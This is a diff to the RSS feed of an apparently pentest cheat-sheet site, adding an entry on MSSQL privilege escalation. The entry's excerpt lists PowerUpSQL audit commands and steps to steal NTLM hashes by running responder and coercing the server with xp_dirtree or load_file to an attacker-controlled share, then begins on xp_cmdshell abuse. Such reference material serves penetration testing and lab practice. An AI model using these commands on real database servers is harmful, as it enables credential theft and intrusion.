@@ -15,6 +15,13 @@
       <description>Basic # Show devices lsblk $ lsblk NAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINT sda 8:0 0 12G 0 disk ├─sda1 8:1 0 120M 0 part /boot ├─sda2 8:2 0 1K 0 part └─sda5 8:5 0 11.9G 0 part ├─Kotarak--vg-root 252:0 0 7G 0 lvm / └─Kotarak--vg-swap_1 252:1 0 1G 0 lvm [SWAP] sr0 11:0 1 1024M 0 rom # Device attributes blkid $ blkid /dev/sda1: UUID=&amp;#34;67e178a9-1b2a-407e-8d3f-7b1772bab2be&amp;#34; TYPE=&amp;#34;ext2&amp;#34; PARTUUID=&amp;#34;1b9f3540-01&amp;#34; /dev/sda5: UUID=&amp;#34;LnUYcF-uZX0-c91G-XfUl-6BqJ-gk8W-QtnncD&amp;#34; TYPE=&amp;#34;LVM2_member&amp;#34; PARTUUID=&amp;#34;1b9f3540-05&amp;#34; /dev/mapper/Kotarak--vg-root: UUID=&amp;#34;efb44a28-8edc-4d40-aca3-81e57d58d759&amp;#34; TYPE=&amp;#34;ext4&amp;#34; /dev/mapper/Kotarak--vg-swap_1: UUID=&amp;#34;162b2913-7dcf-4ba7-bddc-238a22f16e52&amp;#34; TYPE=&amp;#34;swap&amp;#34; # Show device mapping ls -l /dev/mapper/ $ ls -l /dev/mapper/ total 0 crw------- 1 root root 10, 236 Sep 22 23:22 control lrwxrwxrwx 1 root root 7 Sep 22 23:22 Kotarak--vg-root -&amp;gt; .</description>
     </item>
     <item>
+      <title>MSSQL Privilege Escalation</title>
+      <link>https://tldrbins.github.io/mssql_privilege_escalation/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/mssql_privilege_escalation/</guid>
+      <description>Enum 1. Import Module . .\PowerUpSQL.ps1 2. Audit Invoke-SQLAudit -Instance &amp;lt;TARGET&amp;gt; -Username &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -Password &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -Verbose 3. Execute Query Get-SQLQuery -Instance &amp;lt;TARGET&amp;gt; -Username &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -Password &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -Query &amp;#34;&amp;lt;QUERY&amp;gt;&amp;#34; -Verbose Ref: PowerUpSQL.ps1&#xA;Abuse #1: Steal NTLM hash 1. Start a Listener sudo responder -I tun0 2. Coercing Authentication Method 1 Method 2 Method 3 xp_dirtree &amp;#39;\\&amp;lt;LOCAL_IP&amp;gt;\any\thing&amp;#39;; use master; exec xp_dirtree &amp;#39;\\&amp;lt;LOCAL_IP&amp;gt;\any\thing&amp;#39;; load_file(&amp;#39;\\&amp;lt;LOCAL_IP&amp;gt;\any\thing&amp;#39;); Abuse #2: Run xp_cmdshell 1. Check Any Policy Blocking xp_cmdshell [Optional] select name from sys.</description>
+    </item>
+    <item>
       <title>SeImpresonate</title>
       <link>https://tldrbins.github.io/seimpresonate/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
